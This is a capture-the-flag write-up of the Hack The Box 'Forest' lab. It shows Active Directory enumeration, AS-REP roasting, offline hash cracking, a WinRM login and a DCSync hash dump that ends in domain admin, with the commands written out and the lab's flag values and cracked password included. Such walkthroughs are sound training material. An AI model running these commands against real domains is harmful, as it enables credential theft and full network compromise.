# HTB: Forest

## Engagement Overview

**Target:** Forest  
**Box IP:** 10.10.10.161    
**Local IP:** 10.10.14.2    
**Date:** 2025-07-15

---

### Objectives

- Enumerate Active Directory/Exchange environment and identify weak Kerberos/LDAP configurations.  
- Obtain an AS-REP roastable TGT, crack offline to recover service account credentials.  
- Use service account to escalate (Exchange abuse → DCSync) and obtain Domain Administrator.  
- Capture `user.txt` and domain `root.txt`.

---

## Service Enumeration

```bash
nmap -p- -sC -sV -oA forest-scan 10.10.10.161
```

**Open ports (condensed):**
- 53/tcp (DNS), 88/tcp (Kerberos), 135/tcp (MS RPC), 139/tcp (NetBIOS), 389/tcp (LDAP), 445/tcp (SMB), 464/tcp (kpasswd), 593/tcp (RPC/HTTP), 636/tcp (LDAPS), 3268/tcp (GC LDAP), 3269/tcp (GC LDAPS)

**Domain info discovered:**
- Domain: `htb.local`
- Hostname/FQDN: `FOREST.htb.local`  
- OS: Windows Server 2016 Standard

Notes: anonymous LDAP binds allowed; message signing required on SMB; Kerberos pre-auth disabled for target service account (AS-REP roastable).

---

## Initial Access

### AS-REP Roasting (Kerberos pre-auth disabled)

```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
# output: AS-REP roastable hash for svc-alfresco
```

### Crack hash offline

```bash
hashcat -m 18200 -a 0 hash.txt wordlist.txt
# recovered: svc-alfresco:s3rvice
```

### Authenticate & foothold

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
# authenticated as svc-alfresco
```

---

## Privilege Escalation

### Exchange/AD abuse → DCSync
- `svc-alfresco` is member of **Account Operators** and has permissions to modify Exchange groups (WriteDACL-like permissions discovered).  
- Abused Exchange permissions to add service account to privileged groups and escalate permissions.  
- Performed DCSync using `impacket-secretsdump` to extract NTLM hashes including Administrator.

```bash
secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
# dumped hashes including Administrator NTLM
```

**Result:** Domain Administrator compromise achieved; domain credentials and hashes extracted.

---

## House Cleaning / Post-Exploitation

- No persistent backdoors created; tooling executed in-memory when possible.  
- Removed any temporary artifacts created during engagement.

**Flags captured:**  
- `user.txt`: `58fc66dc0f2af05eb1a1751186720d85`  
- `root.txt` (domain/root): `c0a4c2b3bd3faf59b20d049d108d7613`

---

## Tools Utilized
- nmap, ldapsearch  
- impacket (GetNPUsers, secretsdump)  
- hashcat  
- evil-winrm  
- ropnop/windapsearch (auxiliary AD tooling)  

---

## Key Takeaways
- Check for Kerberos pre-auth disabled accounts early (AS-REP roasting).  
- Exchange permissions are powerful: misconfigured Exchange delegation can lead to DCSync and full domain compromise.  
- AD enumeration (LDAP/GC) and group mapping are essential on Windows domain boxes.  
